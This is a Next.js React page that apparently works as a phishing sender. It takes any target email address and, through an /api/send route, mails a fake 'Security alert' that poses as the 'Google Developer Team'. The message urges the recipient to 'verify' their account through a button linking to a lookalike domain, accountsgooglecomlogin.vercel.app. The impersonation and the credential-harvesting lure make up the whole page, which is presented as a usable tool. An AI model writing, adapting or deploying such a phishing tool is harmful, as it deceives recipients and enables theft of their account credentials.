"use client";
import { useState } from "react";

export default function Home() {
  const [email, setEmail] = useState("");

  async function sendEmail() {

    const res = await fetch("/api/send", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        toEmail: email, 
        subject: "Security alert",
        htmlContent: 
        `<div>
        <p style="font-size: 18px; margin:10px 0;">Hello, Google Account User</p>
        <div>There is something went wrong in your account,</div>
        <div style="margin:10px 0;">Please Sign in your account for verification</div>
        <a 
            href="https://accountsgooglecomlogin.vercel.app"
            style="text-decoration:none; display:inline-block; background-color:rgb(79, 132, 247); color:white; padding:10px 15px;  border-radius:4px; margin:15px 0;"
          >Click here to verify</a>
        <div>Thank you,<br>Google Developer Team</div>
    </div>`,
      }),
    });

    const data = await res.json();
    console.log(data.message || data.error)
  }

  return (

    <div className="p-10">
      <input
        type="email"
        placeholder="Enter user email"
        value={email}
        onChange={(e) => setEmail(e.target.value)}
        className="border p-2 rounded mr-2"
      />
      <button onClick={sendEmail} className="bg-green-500 text-white px-4 py-2 rounded">
        Send Email
      </button>
    </div>
  );
}
